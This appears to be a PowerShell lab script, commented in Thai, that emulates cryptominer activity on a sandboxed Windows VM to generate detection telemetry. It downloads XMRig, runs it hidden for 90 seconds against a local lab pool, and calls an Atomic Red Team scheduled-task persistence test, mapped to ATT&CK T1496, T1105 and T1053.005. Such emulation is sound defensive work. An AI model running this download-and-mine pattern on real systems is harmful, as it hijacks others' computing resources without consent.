# miner_real_win.ps1 - cryptominer พฤติกรรมจริงด้วย XMRig (Windows)
# คู่ขนานกับ scenarios/miner_real.sh ฝั่ง Linux
#
# XMRig Windows build จาก GitHub -> ขุดจริง (RandomX) ต่อ mining_pool.py (:3333)
# labeling: XMRig spawn จาก C:\lab_sandbox (seed) -> lineage จับได้
# ATT&CK: T1496 Resource Hijacking, T1105 Ingress Tool Transfer
. "$PSScriptRoot\_lib.ps1"
Banner "miner_real_win"
Setup-Sandbox

$poolHost = "192.168.56.1"
$poolPort = "3333"
$mine = "C:\lab_sandbox\miner"
New-Item -ItemType Directory -Path $mine -Force | Out-Null

# --- Stage 1: recon ---
Write-Host "[miner] recon"
Get-CimInstance Win32_Processor | Select-Object Name, NumberOfCores | Out-File "$mine\cpu.txt"
Get-CimInstance Win32_ComputerSystem | Out-File "$mine\sys.txt"

# --- Stage 2: download XMRig (T1105) ---
$ver = "6.21.3"
# gcc build = static-linked (ไม่ต้อง VC++ Redistributable ที่ VM ไม่มี)
# msvc build จะ crash ทันทีถ้าไม่มี redist -> ProcessCreate มีแต่ไม่ต่อ pool
$url = "https://github.com/xmrig/xmrig/releases/download/v$ver/xmrig-$ver-gcc-win64.zip"
$zip = "$mine\xmrig.zip"
if (-not (Test-Path "$mine\xmrig.exe")) {
    Write-Host "[miner] download XMRig"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    try {
        Invoke-WebRequest $url -OutFile $zip -UseBasicParsing -TimeoutSec 120
        Expand-Archive $zip $mine -Force
        $bin = Get-ChildItem $mine -Recurse -Filter xmrig.exe | Select-Object -First 1
        if ($bin) { Copy-Item $bin.FullName "$mine\xmrig.exe" -Force }
    } catch { Write-Host "[!] download fail: $_" }
}

if (Test-Path "$mine\xmrig.exe") {
    # --- Stage 3: mine 90s ---
    Write-Host "[miner] start mining -> ${poolHost}:${poolPort}"
    $p = Start-Process -FilePath "$mine\xmrig.exe" `
        -ArgumentList "-o", "${poolHost}:${poolPort}", "-u", "lab_worker", "-p", "x",
                      "--coin", "monero", "--no-color", "--threads", "2", "--donate-level", "0" `
        -WorkingDirectory $mine -PassThru -WindowStyle Hidden
    Start-Sleep -Seconds 90
    if ($p -and -not $p.HasExited) { Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue }
    Write-Host "[miner] mining done"
} else {
    Write-Host "[!] no xmrig.exe - skip (check NAT)"
}

# --- Stage 4: persistence (scheduled task) ---
Atomic "T1053.005" "1"
Atomic-Cleanup "T1053.005" "1"
Done-Banner "miner_real_win"
